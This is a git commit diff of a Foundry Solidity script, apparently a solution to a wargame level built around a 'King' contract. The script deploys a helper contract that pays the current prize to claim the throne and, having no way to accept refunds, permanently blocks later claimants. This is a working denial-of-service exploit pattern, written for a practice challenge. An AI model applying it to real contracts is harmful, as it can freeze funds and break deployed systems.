6c4cbea52b2fb9bb43476789fba3b6288525dea1
pavansarvesh <pavansarvesh31@gmail.com>
2025-06-17 12:19:59 +0000

    code : level 9 completed

--- script/level9Solution.s.sol
+++ script/level9Solution.s.sol
@@ -6,25 +6,21 @@ import {Script} from "forge-std/Script.sol";
 import {console} from "forge-std/console.sol";
 
 contract LastKing {
-    constructor(King _lastKing){
-        address(_lastKing).call{value: 0 wei}("");
+    constructor(King _kingInstance) payable {
+        (bool success, ) = address(_kingInstance).call{
+            value: _kingInstance.prize()
+        }("");
+        require(success, "Reverted!");
     }
 }
 
 contract Level9Solution is Script {
     King kingInstance =
-        King(payable(0xFC87B2DC597CCdBf5764F28F2E8303a0ff244D07));
+        King(payable(0xC8B9ea5126e3E4632f412527B6cD9a0C328ccE92));
 
     function run() external {
         vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
-        console.log("Old King : ", kingInstance._king());
-        console.log(kingInstance.prize());
-
-        (bool success, ) = address(kingInstance).call{value: 0 wei}("");
-        if (success) {
-            console.log("new King : ", kingInstance._king());
-        }
-
+        new LastKing{value: kingInstance.prize()}(kingInstance);
         vm.stopBroadcast();
     }
 }
